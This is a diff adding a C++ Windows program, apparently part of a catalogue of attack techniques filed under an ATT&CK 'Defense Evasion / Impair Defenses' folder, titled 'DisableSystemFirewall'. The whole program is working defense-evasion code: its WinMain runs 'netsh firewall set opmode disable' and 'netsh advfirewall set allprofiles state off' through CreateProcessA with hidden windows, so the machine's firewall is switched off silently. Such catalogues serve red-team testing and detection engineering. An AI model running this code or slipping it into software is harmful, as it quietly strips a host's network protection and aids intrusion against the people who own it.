@@ -1,0 +1,53 @@
+---
+title: "DisableSystemFirewall"
+folder: "07. Defense Evasion/T1562 Impair Defenses/.004.Disable or Modify System Firewall"
+---
+
+
+
+#include <windows.h>
+#include <fstream>
+#include <iostream>
+
+
+void FIR() {
+
+    const char* command = "netsh firewall set opmode disable";
+    STARTUPINFOA si = {};
+    si.cb = sizeof(STARTUPINFOA);
+    si.dwFlags = STARTF_USESHOWWINDOW;
+    si.wShowWindow = SW_HIDE;
+
+    PROCESS_INFORMATION pi;
+
+
+    if (CreateProcessA(NULL, const_cast<LPSTR>(command), NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
+        WaitForSingleObject(pi.hProcess, INFINITE);
+        CloseHandle(pi.hThread);
+        CloseHandle(pi.hProcess);
+    }
+}
+void ADVFIR() {
+
+    const char* command = "netsh advfirewall set allprofiles state off";
+    STARTUPINFOA si = {};
+    si.cb = sizeof(STARTUPINFOA);
+    si.dwFlags = STARTF_USESHOWWINDOW;
+    si.wShowWindow = SW_HIDE;
+
+    PROCESS_INFORMATION pi;
+
+
+    if (CreateProcessA(NULL, const_cast<LPSTR>(command), NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
+        WaitForSingleObject(pi.hProcess, INFINITE);
+        CloseHandle(pi.hThread);
+        CloseHandle(pi.hProcess);
+    }
+}
+int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
+
+ 
+    FIR();
+    ADVFIR();
+    return 0;
+}
